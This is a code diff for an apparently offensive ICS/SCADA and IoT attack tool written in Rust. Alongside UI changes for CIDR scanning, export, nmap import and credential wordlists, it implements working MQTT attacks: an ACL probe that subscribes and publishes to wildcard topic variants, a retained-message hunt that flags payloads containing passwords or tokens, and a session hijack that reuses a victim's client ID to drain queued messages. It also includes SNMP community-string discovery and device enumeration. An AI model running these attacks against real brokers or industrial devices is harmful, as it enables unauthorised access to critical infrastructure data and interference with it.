+            app.export_format = match app.export_format {
+                ExportFormat::Json => ExportFormat::Csv,
+                ExportFormat::Csv => ExportFormat::Json,
+            };
+            let fmt = match app.export_format {
+                ExportFormat::Json => "JSON",
+                ExportFormat::Csv => "CSV",
+            };
+            app.output_lines.push(format!("[*] Export format: {fmt} (press X to export)"));
+        }
+        KeyCode::Char('i' | 'I') => {
+            app.input_buf.clear();
+            app.mode = Mode::ImportInput;
+        }
         KeyCode::Char('d' | 'D') => {
             if let Some(dev) = app.selected_device() {
                 let (id, ip) = (dev.id, dev.ip.clone());
@@ -5676,14 +5963,40 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
             app.input_buf.clear();
             app.mode = Mode::Search;
         }
-        KeyCode::Char('w' | 'W') => {
+        KeyCode::Char('b' | 'B') => {
             app.references_scroll = 0;
             app.mode = Mode::References;
+        }
+        KeyCode::Char('w' | 'W') => {
+            app.input_buf = app.wordlist_path.clone().unwrap_or_default();
+            app.mode = Mode::WordlistInput;
         }
         KeyCode::Char('m' | 'M') => {
             let ip = app.selected_device_ip().unwrap_or_else(|| "127.0.0.1".to_string());
             let port = app.field_port(&["port"], 1883);
             app.enter_mqtt_monitor(&ip, port);
+        }
+        KeyCode::Char('u' | 'U') => {
+            app.input_buf.clear();
+            app.mode = Mode::MqttCredInput;
+        }
+        KeyCode::Char('t') => {
+            app.mqtt_conn.tls = !app.mqtt_conn.tls;
+            let state = if app.mqtt_conn.tls { "ON" } else { "OFF" };
+            app.output_lines.push(format!("[*] MQTT TLS: {state} (applies on next connect)"));
+            app.output_scroll = 0;
+        }
+        KeyCode::Char('v') => {
+            app.mqtt_conn.version = match app.mqtt_conn.version {
+                MqttVersion::V311 => MqttVersion::V5,
+                MqttVersion::V5 => MqttVersion::V311,
+            };
+            let ver = match app.mqtt_conn.version {
+                MqttVersion::V311 => "3.1.1",
+                MqttVersion::V5 => "5.0",
+            };
+            app.output_lines.push(format!("[*] MQTT version: {ver} (applies on next connect)"));
+            app.output_scroll = 0;
         }
         KeyCode::Char('z' | 'Z') => {
             app.stealth = !app.stealth;
@@ -5715,6 +6028,45 @@ fn handle_ip_input(app: &mut App, code: KeyCode) {
         }
         KeyCode::Enter => {
             let raw = app.input_buf.trim().to_string();
+            if raw.contains('/') {
+                match raw.parse::<ipnetwork::IpNetwork>() {
+                    Ok(net) => {
+                        const MAX_HOSTS: u128 = 1024;
+                        let size: u128 = match net.size() {
+                            ipnetwork::NetworkSize::V4(n) => u128::from(n),
+                            ipnetwork::NetworkSize::V6(n) => n,
+                        };
+                        if size > MAX_HOSTS {
+                            app.output_lines.push(format!(
+                                "[-] {net} has {size} hosts: TUI limit is {MAX_HOSTS}. Use /22 or smaller."
+                            ));
+                        } else {
+                            if app.active_jobs == 0 {
+                                app.output_lines.clear();
+                                app.output_scroll = 0;
+                            }
+                            let hosts: Vec<std::net::IpAddr> = net.iter().collect();
+                            app.output_lines.push(format!(
+                                "[*] Scanning {} hosts in {net}\u{2026}",
+                                hosts.len()
+                            ));
+                            for host in hosts {
+                                app.active_jobs += 1;
+                                spawn_ip_scan(
+                                    TargetScan::new(host.to_string()),
+                                    app.scan_tx.clone(),
+                                );
+                            }
+                        }
+                    }
+                    Err(_) => {
+                        app.output_lines.push(format!("[-] Invalid CIDR: {raw}"));
+                    }
+                }
+                app.mode = Mode::Normal;
+                app.input_buf.clear();
+                return;
+            }
             if let Some(target) = parse_target_scan(&raw) {
                 if app.active_jobs == 0 {
                     app.output_lines.clear();
@@ -5735,7 +6087,7 @@ fn handle_ip_input(app: &mut App, code: KeyCode) {
         KeyCode::Backspace => {
             app.input_buf.pop();
         }
-        KeyCode::Char(c) if app.input_buf.len() < 40 => app.input_buf.push(c),
+        KeyCode::Char(c) if app.input_buf.len() < 50 => app.input_buf.push(c),
         _ => {}
     }
 }
@@ -6140,32 +6492,87 @@ fn run_loop<B: Backend>(terminal: &mut Terminal<B>, app: &mut App, db: &Database
     Ok(())
 }
 
-// ─── MQTT monitor ────────────────────────────────────────────────────────────
+// ─── Export ──────────────────────────────────────────────────────────────────
 
-fn detect_payload_tui(topic: &str, payload: &[u8]) -> (&'static str, String) {
-    if topic.starts_with("spBv1.0/") || topic.starts_with("spAv1.0/") {
-        let hex = payload.iter().map(|b| format!("{b:02x}")).collect::<Vec<_>>().join(" ");
-        return ("sparkplug-b", hex);
+fn export_to_file(app: &App) -> anyhow::Result<String> {
+    let epoch = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+
+    let all_devices = Database::open(&Database::default_path())
+        .and_then(|d| d.load_devices())
+        .unwrap_or_default();
+
+    if matches!(app.export_format, ExportFormat::Csv) {
+        let filename = format!("scadaver-{epoch}.csv");
+        let mut out = String::from("ip,vendor,last_seen,fields\n");
+        for d in &all_devices {
+            let fields_json = serde_json::to_string(&d.fields)
+                .unwrap_or_else(|_| "{}".to_string())
+                .replace('"', "\"\"");
+            let _ = writeln!(out, "{},{},{},\"{}\"", d.ip, d.vendor, d.last_seen, fields_json);
+        }
+        std::fs::write(&filename, out)?;
+        return Ok(filename);
     }
-    if let Ok(s) = std::str::from_utf8(payload) {
-        let t = s.trim();
-        if t.starts_with('{') || t.starts_with('[') {
-            return ("json", t.to_string());
-        }
-        if t.parse::<f64>().is_ok() {
-            return ("number", t.to_string());
-        }
-        if t.eq_ignore_ascii_case("true") || t.eq_ignore_ascii_case("false") {
-            return ("bool", t.to_string());
-        }
-        if payload.iter().all(|&b| (0x20u8..0x7F).contains(&b)) {
-            return ("text", t.to_string());
-        }
-        return ("utf8", t.to_string());
+
+    let filename = format!("scadaver-{epoch}.json");
+
+    let devices: Vec<serde_json::Value> = all_devices
+        .iter()
+        .map(|d| {
+            serde_json::json!({
+                "ip": d.ip,
+                "vendor": d.vendor,
+                "last_seen": d.last_seen,
+                "fields": d.fields,
+            })
+        })
+        .collect();
+
+    let mqtt_section = if app.mqtt_session.is_some() || !app.mqtt_broker.is_empty() {
+        let topics: Vec<serde_json::Value> = app
+            .mqtt_topics
+            .iter()
+            .map(|(t, c, last)| {
+                serde_json::json!({
+                    "topic": t,
+                    "count": c,
+                    "last_payload": last,
+                    "retained": app.mqtt_retained.contains(t.as_str()),
+                })
+            })
+            .collect();
+        Some(serde_json::json!({
+            "broker": app.mqtt_broker,
+            "topics": topics,
+            "attack_results": app.mqtt_attack_lines,
+            "attack_label": app.mqtt_attack_label,
+        }))
+    } else {
+        None
+    };
+
+    let mut root = serde_json::json!({
+        "tool": "scadaver",
+        "version": env!("CARGO_PKG_VERSION"),
+        "exported_at": epoch,
+        "source": "tui",
+        "devices": devices,
+        "output": app.output_lines,
+    });
+
+    if let Some(mqtt) = mqtt_section {
+        root["mqtt"] = mqtt;
     }
-    let hex = payload.iter().map(|b| format!("{b:02x}")).collect::<Vec<_>>().join(" ");
-    ("binary", hex)
+
+    let text = serde_json::to_string_pretty(&root)?;
+    std::fs::write(&filename, text)?;
+    Ok(filename)
 }
+
+// ─── MQTT monitor ────────────────────────────────────────────────────────────
 
 fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
     let rows = Layout::default()
@@ -6178,9 +6585,13 @@ fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
     } else {
         format!("  filter: {}", app.mqtt_filter)
     };
+    let tls_badge = if app.mqtt_conn.tls || app.mqtt_broker.contains(":8883") { "  TLS" } else { "" };
+    let ver_badge = match app.mqtt_conn.version { MqttVersion::V311 => "", MqttVersion::V5 => "  v5.0" };
     let header_text = format!(
-        " MQTT  {}  \u{2502}  {} topics  \u{2502}  {} msgs{}  \u{2502}  [ESC/M] disconnect",
+        " MQTT  {}{}{}  \u{2502}  {} topics  \u{2502}  {} msgs{}  \u{2502}  [ESC/M] disconnect",
         app.mqtt_broker,
+        tls_badge,
+        ver_badge,
         app.mqtt_topics.len(),
         app.mqtt_total_msgs,
         filter_note,
@@ -6240,7 +6651,8 @@ fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
             cols[1],
         );
     } else {
-        let title = format!(" {} — press c to clear ", app.mqtt_attack_label);
+        let running_tag = if app.mqtt_attack_running { " [running\u{2026}]" } else { "" };
+        let title = format!(" {}{running_tag} — press c to clear ", app.mqtt_attack_label);
         let content = app.mqtt_attack_lines.join("\n");
         let scroll_row = u16::try_from(app.mqtt_attack_scroll).unwrap_or(u16::MAX);
         frame.render_widget(
@@ -6271,8 +6683,20 @@ fn handle_mqtt_monitor(app: &mut App, code: KeyCode) {
         KeyCode::Char('/') => {
             app.mqtt_filter.clear();
         }
-        KeyCode::Char('a') => run_tui_acl(app),
-        KeyCode::Char('r') => run_tui_retain(app),
+        KeyCode::Char('a') => {
+            if app.mqtt_attack_running {
+                app.mqtt_attack_lines.push("[*] Attack already running\u{2026}".into());
+            } else {
+                run_tui_acl(app);
+            }
+        }
+        KeyCode::Char('r') => {
+            if app.mqtt_attack_running {
+                app.mqtt_attack_lines.push("[*] Attack already running\u{2026}".into());
+            } else {
+                run_tui_retain(app);
+            }
+        }
         KeyCode::Char('s') => {
             app.input_buf.clear();
             app.mode = Mode::MqttClientIdInput;
@@ -6336,6 +6760,219 @@ fn draw_mqtt_clientid_input(frame: &mut Frame, area: Rect, app: &App) {
     );
 }
 
+fn handle_mqtt_cred_input(app: &mut App, code: KeyCode) {
+    match code {
+        KeyCode::Esc => {
+            app.input_buf.clear();
+            app.mode = Mode::Normal;
+        }
+        KeyCode::Enter => {
+            let raw = app.input_buf.trim().to_string();
+            app.input_buf.clear();
+            app.mode = Mode::Normal;
+            if raw.is_empty() {
+                app.mqtt_username.clear();
+                app.mqtt_password.clear();
+                app.log("[*] MQTT credentials cleared".to_string());
+            } else if let Some((u, p)) = raw.split_once(':') {
+                app.mqtt_username = u.to_string();
+                app.mqtt_password = p.to_string();
+                app.log(format!("[*] MQTT credentials set: user={u}"));
+            } else {
+                app.mqtt_username.clone_from(&raw);
+                app.mqtt_password.clear();
+                app.log(format!("[*] MQTT username set (no password): user={raw}"));
+            }
+        }
+        KeyCode::Backspace => {
+            app.input_buf.pop();
+        }
+        KeyCode::Char(c) => {
+            app.input_buf.push(c);
+        }
+        _ => {}
+    }
+}
+
+fn draw_mqtt_cred_input(frame: &mut Frame, area: Rect, app: &App) {
+    let cred_hint = if app.mqtt_username.is_empty() {
+        "(no credentials set)".to_string()
+    } else {
+        format!("current user: {}", app.mqtt_username)
+    };
+    let popup = centered_rect(58, 28, area);
+    frame.render_widget(Clear, popup);
+    frame.render_widget(
+        Paragraph::new(format!(
+            "\n  Format:  username:password\n  Empty = clear credentials\n\n  {cred_hint}\n\n  > {}\u{2588}",
+            app.input_buf
+        ))
+        .block(
+            Block::default()
+                .borders(Borders::ALL)
+                .title(" MQTT Credentials — [ENTER] save  [ESC] cancel "),
+        ),
+        popup,
+    );
+}
+
+fn handle_import_input(app: &mut App, db: &Database, code: KeyCode) {
+    match code {
+        KeyCode::Esc => {
+            app.input_buf.clear();
+            app.mode = Mode::Normal;
+        }
+        KeyCode::Enter => {
+            let path = app.input_buf.trim().to_string();
+            app.input_buf.clear();
+            app.mode = Mode::Normal;
+            if path.is_empty() {
+                app.log("[!] No path entered".to_string());
+                return;
+            }
+            match crate::import::parse_nmap_xml(&path) {
+                Err(e) => {
+                    app.output_lines.push(format!("[!] Import failed: {e:#}"));
+                }
+                Ok(hosts) => {
+                    let total = hosts.len();
+                    let mut imported = 0usize;
+                    for host in &hosts {
+                        let mut obj = serde_json::Map::new();
+                        obj.insert(
+                            "open_ports".to_string(),
+                            serde_json::json!(host.open_ports),
+                        );
+                        if !host.hostnames.is_empty() {
+                            obj.insert(
+                                "hostnames".to_string(),
+                                serde_json::json!(host.hostnames),
+                            );
+                        }
+                        let fields = serde_json::Value::Object(obj);
+                        if db.upsert_device(&host.ip, "nmap", &fields).is_ok() {
+                            imported += 1;
+                        }
+                    }
+                    app.output_lines.push(format!(
+                        "[+] Imported {imported}/{total} hosts from {path}"
+                    ));
+                    app.reload(db);
+                }
+            }
+        }
+        KeyCode::Backspace => {
+            app.input_buf.pop();
+        }
+        KeyCode::Char(c) => app.input_buf.push(c),
+        _ => {}
+    }
+}
+
+fn draw_import_input(frame: &mut Frame, area: Rect, app: &App) {
+    let text = vec![
+        Line::from(""),
+        Line::from(Span::styled(
+            " Path to nmap XML output file:",
+            Style::default().fg(Color::DarkGray),
+        )),
+        Line::from(""),
+        Line::from(Span::styled(
+            format!("  > {}\u{2588}", app.input_buf),
+            Style::default()
+                .fg(Color::Cyan)
+                .add_modifier(Modifier::BOLD),
+        )),
+        Line::from(""),
+        Line::from(Span::styled(
+            " Generate with: nmap -oX scan.xml <target>",
+            Style::default().fg(Color::DarkGray),
+        )),
+        Line::from(Span::styled(
+            " Imports all up hosts with at least one open port.",
+            Style::default().fg(Color::DarkGray),
+        )),
+    ];
+    frame.render_widget(
+        Paragraph::new(text)
+            .block(
+                Block::default()
+                    .title(" Import nmap XML ")
+                    .borders(Borders::ALL)
+                    .border_style(Style::default().fg(Color::Cyan)),
+            )
+            .wrap(Wrap { trim: false }),
+        area,
+    );
+}
+
+fn handle_wordlist_input(app: &mut App, code: KeyCode) {
+    match code {
+        KeyCode::Esc => {
+            app.input_buf.clear();
+            app.mode = Mode::Normal;
+        }
+        KeyCode::Enter => {
+            let raw = app.input_buf.trim().to_string();
+            app.input_buf.clear();
+            app.mode = Mode::Normal;
+            if raw.is_empty() {
+                app.wordlist_path = None;
+                app.log("[*] Wordlist cleared — using built-in defaults".to_string());
+            } else {
+                app.wordlist_path = Some(raw.clone());
+                app.log(format!("[*] Wordlist set: {raw}"));
+            }
+        }
+        KeyCode::Backspace => {
+            app.input_buf.pop();
+        }
+        KeyCode::Char(c) => app.input_buf.push(c),
+        _ => {}
+    }
+}
+
+fn draw_wordlist_input(frame: &mut Frame, area: Rect, app: &App) {
+    let current = app
+        .wordlist_path
+        .as_deref()
+        .unwrap_or("(none — using built-in defaults)");
+    let text = vec![
+        Line::from(""),
+        Line::from(Span::styled(
+            " Path to credential wordlist (user:pass, one per line):",
+            Style::default().fg(Color::DarkGray),
+        )),
+        Line::from(""),
+        Line::from(Span::styled(
+            format!("  > {}\u{2588}", app.input_buf),
+            Style::default()
+                .fg(Color::Cyan)
+                .add_modifier(Modifier::BOLD),
+        )),
+        Line::from(""),
+        Line::from(Span::styled(
+            format!("  Current: {current}"),
+            Style::default().fg(Color::DarkGray),
+        )),
+        Line::from(Span::styled(
+            " Leave empty and press ENTER to reset to built-in defaults.",
+            Style::default().fg(Color::DarkGray),
+        )),
+    ];
+    frame.render_widget(
+        Paragraph::new(text)
+            .block(
+                Block::default()
+                    .title(" Custom Wordlist ")
+                    .borders(Borders::ALL)
+                    .border_style(Style::default().fg(Color::Cyan)),
+            )
+            .wrap(Wrap { trim: false }),
+        area,
+    );
+}
+
 fn run_tui_acl(app: &mut App) {
     let base = {
         let filter_lower = app.mqtt_filter.to_lowercase();
@@ -6349,86 +6986,123 @@ fn run_tui_acl(app: &mut App) {
         filtered.get(idx).map(|t| (*t).clone())
     };
     let Some(base) = base else { return };
-    let Some(session) = app.mqtt_session.as_mut() else { return };
+    let Some(arc) = app.mqtt_session.as_ref() else { return };
+    let arc = Arc::clone(arc);
+    let tx = app.scan_tx.clone();
 
-    let sep = "─".repeat(60);
-    let mut lines = vec![
-        format!(" ACL probe: {base}"),
-        sep.clone(),
-        format!("{:<26} {}", "variant", "access"),
-        sep.clone(),
-    ];
-
-    let mut tested = std::collections::HashSet::new();
-    let variants = mqtt_acl_variants(&base);
-    for variant in variants {
-        if tested.len() >= 20 {
-            lines.push("[limit] max 20 variants reached.".into());
-            break;
-        }
-        if !tested.insert(variant.clone()) {
-            continue;
-        }
-        let sub_ok = session.subscribe(&variant, 0).is_ok();
-        let rx_count = if sub_ok {
-            let dl = std::time::Instant::now() + Duration::from_millis(500);
-            let mut n = 0usize;
-            while std::time::Instant::now() < dl {
-                n += session.drain_messages().len();
-                std::thread::sleep(Duration::from_millis(50));
-            }
-            let _ = session.unsubscribe(&variant);
-            n
-        } else {
-            0
-        };
-        let pub_ok = session.publish(&variant, b"scadaver/acl-probe", 0, false).is_ok();
-        let sl = if sub_ok { format!("SUB:YES({rx_count})") } else { "SUB:NO    ".into() };
-        let pl = if pub_ok { "PUB:YES" } else { "PUB:NO " };
-        lines.push(format!("[{sl:<12} {pl}]  {variant}"));
-    }
-    lines.push(sep);
-    lines.push(format!(" {} variant(s) tested.", tested.len()));
-    app.mqtt_attack_lines = lines;
+    app.mqtt_attack_running = true;
+    app.mqtt_attack_lines.clear();
+    app.mqtt_attack_lines.push(format!(" ACL probe: {base}"));
+    app.mqtt_attack_lines.push("─".repeat(60));
+    app.mqtt_attack_lines.push(format!("{:<26} access", "variant"));
+    app.mqtt_attack_lines.push("─".repeat(60));
     app.mqtt_attack_scroll = 0;
     app.mqtt_attack_label = "ACL Probe".into();
+
+    std::thread::spawn(move || {
+        let mut session = arc.lock().unwrap();
+        session.flush_subacks();
+        let mut tested = std::collections::HashSet::new();
+        let variants = acl_variants(&base);
+        for variant in variants {
+            if tested.len() >= 20 {
+                let _ = tx.send(ScanEvent::MqttLine("[limit] max 20 variants reached.".into()));
+                break;
+            }
+            if !tested.insert(variant.clone()) {
+                continue;
+            }
+            let sub_sent = session.subscribe(&variant, 0).is_ok();
+            let sl = if sub_sent {
+                let code = session.poll_suback(Duration::from_millis(500));
+                let granted = code.is_some_and(|c| c < 0x80);
+                let n = if granted {
+                    let dl = std::time::Instant::now() + Duration::from_millis(500);
+                    let mut count = 0usize;
+                    while std::time::Instant::now() < dl {
+                        count += session.drain_messages().len();
+                        std::thread::sleep(Duration::from_millis(50));
+                    }
+                    count
+                } else {
+                    0
+                };
+                let _ = session.unsubscribe(&variant);
+                if granted { format!("SUB:YES({n})") } else { "SUB:DENY  ".into() }
+            } else {
+                "SUB:ERR   ".into()
+            };
+            let pub_ok = session.publish(&variant, b"scadaver/acl-probe", 0, false).is_ok();
+            let pl = if pub_ok { "PUB:YES" } else { "PUB:NO " };
+            let _ = tx.send(ScanEvent::MqttLine(format!("[{sl:<12} {pl}]  {variant}")));
+        }
+        let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
+        let _ = tx.send(ScanEvent::MqttLine(format!(" {} variant(s) tested.", tested.len())));
+        let _ = tx.send(ScanEvent::MqttDone("ACL Probe".into()));
+    });
 }
 
 fn run_tui_retain(app: &mut App) {
-    let Some(session) = app.mqtt_session.as_mut() else { return };
-    let _ = session.subscribe("#", 0);
+    let Some(arc) = app.mqtt_session.as_ref() else { return };
+    let arc = Arc::clone(arc);
+    let tx = app.scan_tx.clone();
 
-    let sep = "─".repeat(60);
-    let mut lines = vec![" Retain Hunt (5s)".to_string(), sep.clone()];
-
-    let deadline = std::time::Instant::now() + Duration::from_secs(5);
-    let mut retained_count = 0usize;
-    let mut sensitive_count = 0usize;
-
-    while std::time::Instant::now() < deadline {
-        for msg in session.drain_messages() {
-            if !msg.retain {
-                continue;
-            }
-            retained_count += 1;
-            let (fmt, display) = detect_payload_tui(&msg.topic, &msg.payload);
-            let sensitive = tui_payload_is_sensitive(&display, &msg.topic);
-            if sensitive {
-                sensitive_count += 1;
-            }
-            let flag = if sensitive { "[SENSITIVE]" } else { "[         ]" };
-            lines.push(format!("{flag}  {} : {}  [{fmt}]", msg.topic, display));
-        }
-        std::thread::sleep(Duration::from_millis(50));
-    }
-    lines.push(sep);
-    lines.push(format!(" {retained_count} retained, {sensitive_count} sensitive."));
-    app.mqtt_attack_lines = lines;
+    app.mqtt_attack_running = true;
+    app.mqtt_attack_lines.clear();
     app.mqtt_attack_scroll = 0;
     app.mqtt_attack_label = "Retain Hunt".into();
+
+    std::thread::spawn(move || {
+        let mut session = arc.lock().unwrap();
+        if session.subscribe("#", 0).is_err() {
+            let _ = tx.send(ScanEvent::MqttLine(" Retain Hunt".into()));
+            let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
+            let _ = tx.send(ScanEvent::MqttLine(
+                "[-] Subscribe to # failed \u{2014} broker may require authentication".into(),
+            ));
+            let _ = tx.send(ScanEvent::MqttDone("Retain Hunt".into()));
+            return;
+        }
+        let _ = tx.send(ScanEvent::MqttLine(" Retain Hunt (5s)".into()));
+        let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
+
+        let deadline = std::time::Instant::now() + Duration::from_secs(5);
+        let mut retained_count = 0usize;
+        let mut sensitive_count = 0usize;
+
+        while std::time::Instant::now() < deadline {
+            for msg in session.drain_messages() {
+                if !msg.retain {
+                    continue;
+                }
+                retained_count += 1;
+                let (fmt, display) = classify_payload(&msg.topic, &msg.payload);
+                let sensitive = is_sensitive(&display, &msg.topic);
+                if sensitive {
+                    sensitive_count += 1;
+                }
+                let flag = if sensitive { "[SENSITIVE]" } else { "[         ]" };
+                let _ = tx.send(ScanEvent::MqttLine(format!(
+                    "{flag}  {} : {}  [{fmt}]",
+                    msg.topic, display
+                )));
+            }
+            std::thread::sleep(Duration::from_millis(50));
+        }
+        let _ = session.unsubscribe("#");
+        let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
+        let _ = tx.send(ScanEvent::MqttLine(format!(
+            " {retained_count} retained, {sensitive_count} sensitive."
+        )));
+        let _ = tx.send(ScanEvent::MqttDone("Retain Hunt".into()));
+    });
 }
 
 fn run_tui_session_hijack(app: &mut App, clientid: &str) {
+    if app.mqtt_attack_running {
+        app.mqtt_attack_lines.push("[*] Attack already running\u{2026}".into());
+        return;
+    }
     let (host, port) = match app.mqtt_broker.rsplit_once(':') {
         Some((h, p)) => match p.parse::<u16>() {
             Ok(p) => (h.to_string(), p),
@@ -6436,109 +7110,80 @@ fn run_tui_session_hijack(app: &mut App, clientid: &str) {
         },
         None => return,
     };
+    let clientid = clientid.to_string();
+    let username = if app.mqtt_username.is_empty() { None } else { Some(app.mqtt_username.clone()) };
+    let password = if app.mqtt_password.is_empty() { None } else { Some(app.mqtt_password.clone()) };
+    let tx = app.scan_tx.clone();
 
-    let sep = "─".repeat(60);
-    let mut lines = vec![
-        format!(" Session Hijack: clientid={clientid}"),
-        sep.clone(),
-    ];
-
-    let opts = ConnectOptions {
-        host,
-        port,
-        client_id: clientid.to_string(),
-        keepalive: 30,
-        clean_session: false,
-        username: None,
-        password: None,
-        will: None,
-    };
-
-    let mut hijack = match MqttSession::connect(&opts) {
-        Ok(s) => {
-            let state = if s.session_present {
-                "YES (queued messages incoming)"
-            } else {
-                "NO (fresh session / victim wiped)"
-            };
-            lines.push(format!("[+] Connected. Session present: {state}"));
-            s
-        }
-        Err(e) => {
-            lines.push(format!("[-] Connect failed: {e:#}"));
-            app.mqtt_attack_lines = lines;
-            app.mqtt_attack_label = "Session Hijack".into();
-            return;
-        }
-    };
-
-    let _ = hijack.subscribe("#", 1);
-    lines.push("[*] Draining for 5s (QoS 1)...".into());
-
-    let deadline = std::time::Instant::now() + Duration::from_secs(5);
-    let mut total = 0usize;
-    let mut unique: std::collections::HashSet<String> = std::collections::HashSet::new();
-
-    while std::time::Instant::now() < deadline {
-        for msg in hijack.drain_messages() {
-            total += 1;
-            unique.insert(msg.topic.clone());
-            let (fmt, display) = detect_payload_tui(&msg.topic, &msg.payload);
-            let tag = if msg.retain { "R" } else { "Q" };
-            lines.push(format!("[{tag}] {} : {}  [{fmt}]", msg.topic, display));
-        }
-        std::thread::sleep(Duration::from_millis(50));
-    }
-    let _ = hijack.disconnect();
-
-    lines.push(sep);
-    lines.push(format!(" {total} messages, {} unique topics.", unique.len()));
-    app.mqtt_attack_lines = lines;
+    app.mqtt_attack_running = true;
+    app.mqtt_attack_lines.clear();
     app.mqtt_attack_scroll = 0;
     app.mqtt_attack_label = "Session Hijack".into();
-}
 
-fn mqtt_acl_variants(topic: &str) -> Vec<String> {
-    let parts: Vec<&str> = topic.split('/').collect();
-    let mut out = Vec::new();
+    std::thread::spawn(move || {
+        let sep = "─".repeat(60);
+        let _ = tx.send(ScanEvent::MqttLine(format!(" Session Hijack: clientid={clientid}")));
+        let _ = tx.send(ScanEvent::MqttLine(sep.clone()));
 
-    out.push(topic.to_string());
-    for i in 0..parts.len() {
-        let mut v = parts.clone();
-        v[i] = "+";
-        out.push(v.join("/"));
-    }
-    for depth in 0..=parts.len() {
-        let v = if depth == 0 {
-            "#".to_string()
-        } else {
-            format!("{}/#", parts[..depth].join("/"))
+        let opts = ConnectOptions {
+            host,
+            port,
+            client_id: clientid,
+            keepalive: 30,
+            clean_session: false,
+            username,
+            password,
+            will: None,
+            tls: false,
+            tls_verify: false,
+            protocol_version: MqttVersion::default(),
         };
-        out.push(v);
-    }
 
-    let mut seen = std::collections::HashSet::new();
-    out.retain(|v| seen.insert(v.clone()));
-    out
-}
+        let mut hijack = match MqttSession::connect(&opts) {
+            Ok(s) => {
+                let state = if s.session_present {
+                    "YES (queued messages incoming)"
+                } else {
+                    "NO (fresh session / victim wiped)"
+                };
+                let _ = tx.send(ScanEvent::MqttLine(format!("[+] Connected. Session present: {state}")));
+                s
+            }
+            Err(e) => {
+                let _ = tx.send(ScanEvent::MqttLine(format!("[-] Connect failed: {e:#}")));
+                let _ = tx.send(ScanEvent::MqttDone("Session Hijack".into()));
+                return;
+            }
+        };
 
-fn tui_payload_is_sensitive(display: &str, topic: &str) -> bool {
-    if display.contains("eyJ") {
-        return true;
-    }
-    let haystack = format!("{} {}", display.to_lowercase(), topic.to_lowercase());
-    for kw in &["password", "passwd", "secret", "token", "credential", "apikey", "api_key"] {
-        if haystack.contains(kw) {
-            return true;
+        let _ = hijack.subscribe("#", 1);
+        let _ = tx.send(ScanEvent::MqttLine("[*] Draining for 5s (QoS 1)...".into()));
+
+        let deadline = std::time::Instant::now() + Duration::from_secs(5);
+        let mut total = 0usize;
+        let mut unique: std::collections::HashSet<String> = std::collections::HashSet::new();
+
+        while std::time::Instant::now() < deadline {
+            for msg in hijack.drain_messages() {
+                total += 1;
+                unique.insert(msg.topic.clone());
+                let (fmt, display) = classify_payload(&msg.topic, &msg.payload);
+                let tag = if msg.retain { "R" } else { "Q" };
+                let _ = tx.send(ScanEvent::MqttLine(format!(
+                    "[{tag}] {} : {}  [{fmt}]",
+                    msg.topic, display
+                )));
+            }
+            std::thread::sleep(Duration::from_millis(50));
         }
-    }
-    let dot_parts: Vec<&str> = display.split('.').collect();
-    if dot_parts.len() == 4
-        && dot_parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
-    {
-        return true;
-    }
-    false
+        let _ = hijack.disconnect();
+        let _ = tx.send(ScanEvent::MqttLine(sep));
+        let _ = tx.send(ScanEvent::MqttLine(format!(
+            " {total} messages, {} unique topics.",
+            unique.len()
+        )));
+        let _ = tx.send(ScanEvent::MqttDone("Session Hijack".into()));
+    });
 }
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
@@ -6553,18 +7198,25 @@ fn hex_fmt(b: &[u8]) -> String {
 
 // ─── SNMP exploits ────────────────────────────────────────────────────────────
 
-fn exploit_snmp_sys_info(ip: &str, port: u16, out: &impl Fn(&str)) {
+fn exploit_snmp_sys_info(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::snmp::{client, oids};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP system info from {ip}:{p}..."));
-    let Some(community) = client::discover_community(ip, p) else {
-        out("[-] No SNMP response on any common community");
-        return;
+    let community_owned;
+    let community = if input.trim().is_empty() {
+        let Some(c) = client::discover_community(ip, p) else {
+            out("[-] No SNMP response on any common community — try supplying the community string manually");
+            return;
+        };
+        community_owned = c;
+        community_owned.as_str()
+    } else {
+        input.trim()
     };
     let scalar = [oids::SYS_DESCR, oids::SYS_OBJECT_ID, oids::SYS_UPTIME,
                   oids::SYS_CONTACT, oids::SYS_NAME, oids::SYS_LOCATION];
     let labels = ["sysDescr", "sysOID", "Uptime", "Contact", "Name", "Location"];
-    match client::get_multi(ip, p, &community, &scalar) {
+    match client::get_multi(ip, p, community, &scalar) {
         Ok(results) => {
             out(&format!("  community = {community}"));
             for (i, (_, val)) in results.iter().enumerate() {
@@ -6576,15 +7228,22 @@ fn exploit_snmp_sys_info(ip: &str, port: u16, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_snmp_interfaces(ip: &str, port: u16, out: &impl Fn(&str)) {
+fn exploit_snmp_interfaces(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::snmp::{client, enumerate};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP interface table from {ip}:{p}..."));
-    let Some(community) = client::discover_community(ip, p) else {
-        out("[-] No SNMP response");
-        return;
+    let community_owned;
+    let community = if input.trim().is_empty() {
+        let Some(c) = client::discover_community(ip, p) else {
+            out("[-] No SNMP response — try supplying the community string manually");
+            return;
+        };
+        community_owned = c;
+        community_owned.as_str()
+    } else {
+        input.trim()
     };
-    match enumerate::get_interfaces(ip, p, &community) {
+    match enumerate::get_interfaces(ip, p, community) {
         Ok(ifaces) if ifaces.is_empty() => out("[!] No interface entries returned"),
         Ok(ifaces) => {
             for i in &ifaces {
@@ -6598,15 +7257,22 @@ fn exploit_snmp_interfaces(ip: &str, port: u16, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_snmp_topology(ip: &str, port: u16, out: &impl Fn(&str)) {
+fn exploit_snmp_topology(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::snmp::{client, enumerate};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP network topology from {ip}:{p}..."));
